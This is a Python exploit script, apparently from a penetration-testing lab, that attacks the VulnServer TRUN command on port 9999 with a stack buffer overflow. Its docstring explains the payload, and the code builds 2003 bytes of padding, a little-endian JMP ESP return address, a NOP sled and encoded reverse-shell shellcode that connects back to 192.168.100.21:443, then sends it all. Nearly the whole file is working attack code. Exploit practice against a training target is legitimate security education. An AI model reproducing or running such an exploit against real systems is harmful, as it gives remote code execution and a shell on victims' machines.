#!/usr/bin/python3

"""
Exploit script for VulnServer buffer overflow vulnerability testing in a controlled security laboratory environment.

This script performs a stack-based buffer overflow attack against a vulnerable TCP service running on port 9999.
It demonstrates exploitation techniques including EIP overwrite, NOP sled, and shellcode injection.

Module Purpose:
    Automate the delivery of a crafted payload to trigger a buffer overflow condition and execute arbitrary code
    on the target service through a reverse shell connection.

Key Components:
    - TCP connection to vulnerable service at 192.168.100.131:9999
    - Banner retrieval and display from the server
    - Payload construction with specific offset calculations
    - TRUN command with specially crafted input to trigger the vulnerability
    - Reverse shell shellcode for 192.168.100.21:443

Payload Structure:
    1. Buffer padding: 2003 bytes of 'A' characters to reach EIP offset
    2. EIP override: 4-byte address (0x62501205) in little-endian format pointing to JMP ESP instruction
    3. NOP sled: 16 bytes of 0x90 (NOP instructions) for landing zone tolerance
    4. Shellcode: Msfvenom-generated reverse shell bytes
    5. Protocol terminator: CRLF line endings (\\r\\n)

Security Constraints:
    - Identified bad characters filtered by target: \\x00, \\x0a, \\x0d
    - Multiple JMP ESP addresses available for exploitation flexibility
    - Shellcode encoded to avoid bad character restrictions

Execution Flow:
    1. Establish socket connection to target service
    2. Receive and display server banner
    3. Construct and send malicious TRUN payload
    4. Capture and display server response
    5. Close socket connection

Legal Notice:
    Strictly for authorized security testing and educational purposes only in controlled laboratory environments.
    Unauthorized access to computer systems is illegal.
"""

import socket

TARGET_HOST = "192.168.100.131"
TARGET_PORT = 9999
COMMAND_PREFIX = b"TRUN /.:/"
EIP_OFFSET = 2003
EIP_VALUE = b"\x05\x12\x50\x62"
NOP_SLED_SIZE = 16

# reverse shell 192.168.100.21 443
shellcode = (
    b"\xd9\xe1\xbe\x77\xa9\xa4\xfa\xd9\x74\x24\xf4\x5b\x29\xc9"
    b"\xb1\x52\x83\xc3\x04\x31\x73\x13\x03\x04\xba\x46\x0f\x16"
    b"\x54\x04\xf0\xe6\xa5\x69\x78\x03\x94\xa9\x1e\x40\x87\x19"
    b"\x54\x04\x24\xd1\x38\xbc\xbf\x97\x94\xb3\x08\x1d\xc3\xfa"
    b"\x89\x0e\x37\x9d\x09\x4d\x64\x7d\x33\x9e\x79\x7c\x74\xc3"
    b"\x70\x2c\x2d\x8f\x27\xc0\x5a\xc5\xfb\x6b\x10\xcb\x7b\x88"
    b"\xe1\xea\xaa\x1f\x79\xb5\x6c\x9e\xae\xcd\x24\xb8\xb3\xe8"
    b"\xff\x33\x07\x86\x01\x95\x59\x67\xad\xd8\x55\x9a\xaf\x1d"
    b"\x51\x45\xda\x57\xa1\xf8\xdd\xac\xdb\x26\x6b\x36\x7b\xac"
    b"\xcb\x92\x7d\x61\x8d\x51\x71\xce\xd9\x3d\x96\xd1\x0e\x36"
    b"\xa2\x5a\xb1\x98\x22\x18\x96\x3c\x6e\xfa\xb7\x65\xca\xad"
    b"\xc8\x75\xb5\x12\x6d\xfe\x58\x46\x1c\x5d\x35\xab\x2d\x5d"
    b"\xc5\xa3\x26\x2e\xf7\x6c\x9d\xb8\xbb\xe5\x3b\x3f\xbb\xdf"
    b"\xfc\xaf\x42\xe0\xfc\xe6\x80\xb4\xac\x90\x21\xb5\x26\x60"
    b"\xcd\x60\xe8\x30\x61\xdb\x49\xe0\xc1\x8b\x21\xea\xcd\xf4"
    b"\x52\x15\x04\x9d\xf9\xec\xcf\x62\x55\x8a\x1a\x0b\xa4\x52"
    b"\x24\x70\x21\xb4\x4c\x96\x64\x6f\xf9\x0f\x2d\xfb\x98\xd0"
    b"\xfb\x86\x9b\x5b\x08\x77\x55\xac\x65\x6b\x02\x5c\x30\xd1"
    b"\x85\x63\xee\x7d\x49\xf1\x75\x7d\x04\xea\x21\x2a\x41\xdc"
    b"\x3b\xbe\x7f\x47\x92\xdc\x7d\x11\xdd\x64\x5a\xe2\xe0\x65"
    b"\x2f\x5e\xc7\x75\xe9\x5f\x43\x21\xa5\x09\x1d\x9f\x03\xe0"
    b"\xef\x49\xda\x5f\xa6\x1d\x9b\x93\x79\x5b\xa4\xf9\x0f\x83"
    b"\x15\x54\x56\xbc\x9a\x30\x5e\xc5\xc6\xa0\xa1\x1c\x43\xc0"
    b"\x43\xb4\xbe\x69\xda\x5d\x03\xf4\xdd\x88\x40\x01\x5e\x38"
    b"\x39\xf6\x7e\x49\x3c\xb2\x38\xa2\x4c\xab\xac\xc4\xe3\xcc"
    b"\xe4"
)


def build_payload():
    return b"A" * EIP_OFFSET + EIP_VALUE + b"\x90" * NOP_SLED_SIZE + shellcode


def build_request(buffer_payload):
    return COMMAND_PREFIX + buffer_payload + b"\r\n"


def run_exploit(buffer_payload, sock_factory=socket.socket):
    request = build_request(buffer_payload)
    connection = sock_factory(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connection.connect((TARGET_HOST, TARGET_PORT))
        banner = connection.recv(1024)
        print(banner.decode())
        connection.send(request)
        response = connection.recv(1024)
        print(response.decode())
    finally:
        connection.close()


payload = build_payload()
run_exploit(payload)